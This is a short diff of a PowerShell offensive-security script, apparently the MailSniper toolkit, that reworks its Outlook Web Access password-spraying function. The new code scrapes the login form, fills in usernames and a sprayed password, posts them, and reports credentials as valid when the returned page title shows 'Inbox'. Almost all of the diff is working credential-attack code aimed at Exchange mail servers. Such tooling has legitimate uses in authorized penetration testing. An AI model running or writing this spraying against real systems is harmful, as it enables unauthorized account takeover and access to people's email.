@@ -1,4 +1,4 @@
-﻿function Invoke-GlobalMailSearch{
+function Invoke-GlobalMailSearch{
 <#
   .SYNOPSIS
 
@@ -1681,16 +1681,19 @@ function Invoke-PasswordSprayOWA{
         #Logging into Outlook Web Access    
         #Setting POST parameters for the login to OWA
         $ProgressPreference = 'silentlycontinue'
-        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Username";password="$Password";isUtf8='1'}
-        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
-        $out = $owalogin.RawContent
-        #Looking in the results for the OWA cadata cookie to determine whether authentication was successful or not.
-        if ($out -like "*cadata*")
-        {
-            Write-Output "[*] SUCCESS! User:$username Password:$password"
-            #$sprayed += "$Username`:$Password"
-        }
-        $curr_user+=1 
+	$sess = ""
+	$owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
+	$form = $owa.Forms[0]
+	$form.fields.password=$Password
+	$form.fields.username=$Username
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
+        #Check title for inbox
+	if ($owalogin.ParsedHtml.title -match "Inbox*")
+	{
+		Write-Output "[*] SUCCESS! User:$username Password:$password"
+	}
+	$curr_user+=1 
+
     }
     } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL | Out-Null
 
